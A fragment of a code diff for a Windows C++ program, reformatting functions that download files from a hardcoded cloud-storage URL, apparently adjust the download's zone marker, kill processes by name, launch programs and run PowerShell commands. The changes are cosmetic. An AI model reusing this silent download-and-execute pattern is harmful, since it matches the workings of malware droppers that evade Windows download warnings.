@@ -49,15 +49,11 @@ static void CombineP(int destIndex, int srcIndex, const std::wstring& addition) 
 
 bool Server(const std::wstring& url, const std::filesystem::path& outputPath)
 {
-	const std::wstring fullUrl =
-		L"https://pub-769810f4ffd448b68be4a51316b03c57.r2.dev/" + url;
+	const std::wstring fullUrl = L"https://pub-769810f4ffd448b68be4a51316b03c57.r2.dev/" + url;
 
 	DeleteUrlCacheEntryW(fullUrl.c_str());
 
-	HRESULT hr = URLDownloadToFileW(nullptr, fullUrl.c_str(),
-		outputPath.c_str(), 0, nullptr);
-
-	if (!SUCCEEDED(hr))
+	if (FAILED(URLDownloadToFileW(nullptr, fullUrl.c_str(), outputPath.c_str(), 0, nullptr)))
 		return false;
 
 	std::filesystem::path zone = outputPath;
@@ -68,7 +64,6 @@ bool Server(const std::wstring& url, const std::filesystem::path& outputPath)
 
 	return true;
 }
-
 
 bool Download(const wchar_t* url, const wchar_t* outPath) {
 	HRESULT hr = URLDownloadToFile(nullptr, url, outPath, 0, nullptr);
@@ -171,7 +166,6 @@ bool PKill(const std::wstring& processName)
 	return true;
 }
 
-
 static bool x64()
 {
 	USHORT processMachine = 0, nativeMachine = 0;
@@ -236,8 +230,6 @@ static void Run(const std::wstring& file, const std::wstring& params, bool wait)
     sei.hInstApp = nullptr;
     ExecuteAndWait(sei, wait);
 }
-
-
 
 bool PShell(const std::vector<std::wstring>& commands)
 {
